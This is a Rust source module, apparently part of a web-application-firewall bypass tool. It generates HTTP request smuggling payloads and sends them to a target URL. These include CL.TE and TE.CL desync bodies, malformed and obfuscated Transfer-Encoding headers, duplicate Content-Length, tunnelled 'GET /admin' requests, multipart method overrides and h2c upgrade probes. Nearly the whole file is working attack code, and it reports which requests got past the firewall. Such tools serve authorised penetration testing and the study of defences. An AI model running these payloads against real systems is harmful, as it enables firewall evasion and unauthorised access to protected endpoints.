use crate::error::Result;
use reqwest::Client;

use super::{BypassResult, BypassTechnique, WafProfile};
use crate::waf::detector::WafDetectionResult;

pub struct SmugglingBypass {
    _profile: Option<WafProfile>,
}

#[derive(Debug, Clone)]
pub enum SmugglingType {
    ClTe,
    TeCl,
    ChunkedMalformed,
    RequestTunneling,
    H2CUpgrade,
    Http2Frame,
    DoubleContentLength,
    MultipartMixed,
}

#[derive(Debug, Clone)]
pub struct SmugglingRequest {
    pub smuggling_type: SmugglingType,
    pub method: String,
    pub path: String,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
    pub description: String,
}

impl SmugglingBypass {
    pub fn new(profile: Option<WafProfile>) -> Self {
        Self { _profile: profile }
    }

    pub async fn run(
        &self,
        client: &Client,
        url: &str,
        detection: &WafDetectionResult,
    ) -> Result<Vec<BypassResult>> {
        let mut results = Vec::new();

        let smuggling_requests = self.generate_smuggling_requests(url);

        for smug_req in smuggling_requests {
            match self.test_smuggling(client, url, &smug_req, detection).await {
                Ok(result) => results.push(result),
                Err(e) => {
                    results.push(BypassResult {
                        technique: BypassTechnique::ContentLengthConflict,
                        success: false,
                        description: format!("{} - Error: {}", smug_req.description, e),
                        status_code: 0,
                        response_diff: None,
                    });
                }
            }
        }

        Ok(results)
    }

    fn generate_smuggling_requests(&self, url: &str) -> Vec<SmugglingRequest> {
        let parsed = url::Url::parse(url).ok();
        let path = parsed.as_ref().map(|u| u.path()).unwrap_or("/");

        let mut requests = Vec::with_capacity(6);

        let body = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), format!("{}", body.len())),
                ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ],
            body: format!("0\r\n\r\n{}", body).into_bytes(),
            description: "CL.TE: Content-Length vs Transfer-Encoding".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE.CL: Chunked encoding test".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: b"1\r\na\r\n1\r\nb\r\n0\r\n\r\n".to_vec(),
            description: "Chunked: Small chunks".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Content-Length".to_string(), "6".to_string())],
            body: b"0\r\n\r\nG".to_vec(),
            description: "CL: Incomplete body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "xchunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE: Malformed chunked encoding".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), " chunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE: Space prefix in header".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), "5".to_string()),
                ("X-HTTP-Method-Override".to_string(), "PUT".to_string()),
            ],
            body: b"hello".to_vec(),
            description: "Method override smuggling".to_string(),
        });

        requests.extend(self.generate_advanced_smuggling(path));

        requests
    }

    #[allow(clippy::vec_init_then_push)]
    fn generate_advanced_smuggling(&self, path: &str) -> Vec<SmugglingRequest> {
        let mut requests = Vec::new();

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::DoubleContentLength,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), "5".to_string()),
                ("Content-Length".to_string(), "10".to_string()),
            ],
            body: b"hello".to_vec(),
            description: "Double Content-Length header".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::RequestTunneling,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Content-Length".to_string(), "88".to_string())],
            body: "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-WAF-Bypass: true\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "Request tunneling via body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::MultipartMixed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Type".to_string(), "multipart/form-data; boundary=----WebKitFormBoundary".to_string()),
            ],
            body: "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\nPUT\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n/admin\r\n------WebKitFormBoundary--\r\n".as_bytes().to_vec(),
            description: "Multipart method override".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::H2CUpgrade,
            method: "GET".to_string(),
            path: path.to_string(),
            headers: vec![
                (
                    "Connection".to_string(),
                    "Upgrade, HTTP2-Settings".to_string(),
                ),
                ("Upgrade".to_string(), "h2c".to_string()),
                ("HTTP2-Settings".to_string(), "AAMAAABkAAQAap__".to_string()),
            ],
            body: vec![],
            description: "HTTP/2 cleartext (h2c) upgrade".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "Chunked with smuggled request in body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "G\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n0\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "Invalid chunk size prefix".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "0\r\n\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "TE.CL with trailing headers".to_string(),
        });

        requests
    }

    async fn test_smuggling(
        &self,
        client: &Client,
        url: &str,
        req: &SmugglingRequest,
        detection: &WafDetectionResult,
    ) -> Result<BypassResult> {
        let request_url = self.compose_request_url(url, &req.path);
        let mut request = match req.method.as_str() {
            "GET" => client.get(&request_url),
            "POST" => client.post(&request_url),
            "PUT" => client.put(&request_url),
            _ => client.post(&request_url),
        };

        for (key, value) in &req.headers {
            request = request.header(key, value);
        }

        request = request.header("User-Agent", crate::waf::bypass::headers::get_random_ua());
        request = request.body(req.body.clone());

        let response = request.send().await?;
        let status = response.status().as_u16();
        let body = response.text().await.unwrap_or_default();

        let mut success = self.is_bypass_successful(status, detection, "", &body);
        let requires_raw_http =
            matches!(req.smuggling_type, SmugglingType::H2CUpgrade | SmugglingType::Http2Frame);
        if requires_raw_http {
            success = false;
        }

        let technique = match req.smuggling_type {
            SmugglingType::ClTe => BypassTechnique::ContentLengthConflict,
            SmugglingType::TeCl => BypassTechnique::TransferEncodingConflict,
            SmugglingType::ChunkedMalformed => BypassTechnique::ChunkedEncoding,
            SmugglingType::RequestTunneling => BypassTechnique::HeaderManipulation,
            SmugglingType::H2CUpgrade => BypassTechnique::EncodingBypass,
            SmugglingType::Http2Frame => BypassTechnique::EncodingBypass,
            SmugglingType::DoubleContentLength => BypassTechnique::ContentLengthConflict,
            SmugglingType::MultipartMixed => BypassTechnique::HeaderManipulation,
        };

        Ok(BypassResult {
            technique,
            success,
            description: if requires_raw_http {
                format!("{} [heuristic probe; raw HTTP required]", req.description)
            } else {
                format!("{} [heuristic probe]", req.description)
            },
            status_code: status,
            response_diff: None,
        })
    }

    fn compose_request_url(&self, base_url: &str, path: &str) -> String {
        if let Ok(base) = url::Url::parse(base_url) {
            if let Ok(joined) = base.join(path) {
                return joined.to_string();
            }
        }
        base_url.to_string()
    }

    fn is_bypass_successful(
        &self,
        status: u16,
        detection: &WafDetectionResult,
        _payload: &str,
        response_body: &str,
    ) -> bool {
        super::is_bypass_successful(status, detection, "", response_body)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn compose_request_url_uses_smuggling_path() {
        let bypass = SmugglingBypass::new(None);
        let composed = bypass.compose_request_url("https://example.com/api", "/admin");
        assert_eq!(composed, "https://example.com/admin");
    }
}

#[allow(dead_code)]
pub fn generate_cl_te_payloads() -> Vec<String> {
    vec![
        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n".to_string(),
        "0\r\n\r\nGET /hidden HTTP/1.1\r\nHost: target\r\n\r\n".to_string(),
    ]
}

#[allow(dead_code)]
pub fn generate_te_cl_payloads() -> Vec<String> {
    vec![
        "5\r\nhello\r\n0\r\n\r\n".to_string(),
        "e\r\nGET / HTTP/1.1\r\n\r\n0\r\n\r\n".to_string(),
    ]
}
